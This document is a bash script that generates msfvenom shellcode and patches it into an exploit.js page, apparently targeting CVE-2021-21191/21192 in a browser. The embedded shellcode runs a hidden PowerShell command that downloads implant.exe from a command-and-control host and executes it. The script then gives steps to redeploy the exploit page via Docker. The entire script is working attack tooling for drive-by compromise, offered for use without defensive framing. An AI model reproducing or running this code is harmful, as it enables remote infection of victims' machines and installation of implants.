#!/bin/bash

# ─────────────────────────────────────────────
#  Shellcode Generator + exploit.js Patcher
# ─────────────────────────────────────────────
# Generates msfvenom shellcode using the supplied host IP,
# converts it to a uint32 array, and patches var shellcode = []
# in exploit.js automatically.

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ENV_FILE="$SCRIPT_DIR/.env"
EXPLOIT_JS="$SCRIPT_DIR/exfil-server/CVE-2021-21191---CVE-2021-21192/exploit.js"
SHELLCODE_BIN="$SCRIPT_DIR/shellcode.bin"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo ""
echo -e "${CYAN}================================================${NC}"
echo -e "${CYAN}      Shellcode Generator + exploit.js Patcher  ${NC}"
echo -e "${CYAN}================================================${NC}"
echo ""

# ── 1. Check dependencies ─────────────────────
echo -e "${YELLOW}[*] Checking dependencies...${NC}"

if ! command -v msfvenom &>/dev/null; then
    echo -e "${RED}[!] msfvenom not found. Install Metasploit Framework and try again.${NC}"
    echo -e "    sudo apt install metasploit-framework"
    exit 1
fi

if ! command -v python3 &>/dev/null; then
    echo -e "${RED}[!] python3 not found. Required for shellcode conversion.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] msfvenom and python3 found.${NC}"

# ── 2. Get host IP ────────────────────────────
echo ""
CURRENT_IP=$(grep -oP '(?<=C2_HOST_IP=)\S+' "$ENV_FILE" 2>/dev/null || echo "")

if [ -n "$CURRENT_IP" ]; then
    echo -e "${YELLOW}[*] Found C2_HOST_IP in .env: ${GREEN}$CURRENT_IP${NC}"
    read -rp "    Use this IP? (Y/n): " USE_CURRENT
    USE_CURRENT="${USE_CURRENT:-Y}"
    if [[ "$USE_CURRENT" =~ ^[Yy]$ ]]; then
        HOST_IP="$CURRENT_IP"
    else
        read -rp "    Enter host IP: " HOST_IP
    fi
else
    echo -e "${YELLOW}[*] No IP found in .env.${NC}"

    echo "    Available IPs:"
    ip -o -4 addr show | awk '{print $2, $4}' | grep -v '^lo ' | grep -v '127\.' | while read -r iface ip; do
        echo -e "      ${GREEN}$iface${NC} → ${ip%/*}"
    done

    echo ""
    read -rp "    Enter your Linux host IP: " HOST_IP
fi

# Validate
if ! echo "$HOST_IP" | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3}$'; then
    echo -e "${RED}[!] Invalid IP: '$HOST_IP'. Exiting.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Using HOST_IP=${HOST_IP}${NC}"

# ── 3. Run msfvenom ───────────────────────────
echo ""
echo -e "${YELLOW}[*] Running msfvenom...${NC}"

POWERSHELL_CMD="powershell -w hidden -c \"(New-Object Net.WebClient).DownloadFile('http://${HOST_IP}:8000/implant.exe','C:\\\\Windows\\\\Temp\\\\implant.exe'); Start-Process 'C:\\\\Windows\\\\Temp\\\\implant.exe'\""

msfvenom \
    -p windows/x64/exec \
    CMD="$POWERSHELL_CMD" \
    -f raw \
    -o "$SHELLCODE_BIN"

if [ ! -f "$SHELLCODE_BIN" ]; then
    echo -e "${RED}[!] msfvenom failed to produce shellcode.bin. Check output above.${NC}"
    exit 1
fi

BYTE_COUNT=$(wc -c < "$SHELLCODE_BIN")
echo -e "${GREEN}[+] shellcode.bin generated (${BYTE_COUNT} bytes).${NC}"

# ── 4. Convert binary → uint32 JS array ──────
echo ""
echo -e "${YELLOW}[*] Converting shellcode to uint32 array...${NC}"

SHELLCODE_ARRAY=$(python3 - "$SHELLCODE_BIN" <<'PYEOF'
import struct, sys

with open(sys.argv[1], 'rb') as f:
    data = f.read()

# Pad to a multiple of 4 bytes (uint32 alignment)
remainder = len(data) % 4
if remainder:
    data += b'\x00' * (4 - remainder)

count = len(data) // 4
ints = struct.unpack('<' + 'I' * count, data)
print('[' + ', '.join(str(i) for i in ints) + ']')
PYEOF
)

UINT_COUNT=$(echo "$SHELLCODE_ARRAY" | tr ',' '\n' | wc -l)
echo -e "${GREEN}[+] Converted to ${UINT_COUNT} uint32 values.${NC}"

# ── 5. Patch exploit.js ───────────────────────
echo ""
echo -e "${YELLOW}[*] Patching exploit.js...${NC}"

if [ ! -f "$EXPLOIT_JS" ]; then
    echo -e "${RED}[!] exploit.js not found at: $EXPLOIT_JS${NC}"
    exit 1
fi

# Backup original
cp "$EXPLOIT_JS" "${EXPLOIT_JS}.bak"
echo -e "${GREEN}[+] Backup saved to exploit.js.bak${NC}"

# Replace the 'var shellcode = [...]' line
python3 - "$EXPLOIT_JS" "$SHELLCODE_ARRAY" <<'PYEOF'
import sys, re

exploit_path = sys.argv[1]
new_array    = sys.argv[2]

with open(exploit_path, 'r') as f:
    content = f.read()

# Replace the active shellcode line (not the commented-out one)
new_line = 'var shellcode = ' + new_array + ';'
patched, count = re.subn(r'^var shellcode = \[.*?\];', new_line, content, flags=re.MULTILINE)

if count == 0:
    print("ERROR: could not find 'var shellcode = [...]' line in exploit.js")
    sys.exit(1)

with open(exploit_path, 'w') as f:
    f.write(patched)

print(f"OK: replaced {count} shellcode line(s)")
PYEOF

echo -e "${GREEN}[+] exploit.js patched successfully.${NC}"

# ── 6. Cleanup ────────────────────────────────
rm -f "$SHELLCODE_BIN"
echo -e "${GREEN}[+] shellcode.bin removed.${NC}"

# ── 7. Summary ────────────────────────────────
echo ""
echo -e "${CYAN}================================================${NC}"
echo -e "${CYAN}                    Done                        ${NC}"
echo -e "${CYAN}================================================${NC}"
echo ""
echo -e "  Shellcode target:  ${GREEN}http://${HOST_IP}:8000/implant.exe${NC}"
echo -e "  exploit.js:        ${GREEN}patched${NC}"
echo -e "  Backup:            ${GREEN}exploit.js.bak${NC}"
echo ""
echo -e "  Rebuild Docker to deploy the updated exploit page:"
echo -e "    ${CYAN}sudo docker compose up --build -d${NC}"
echo ""
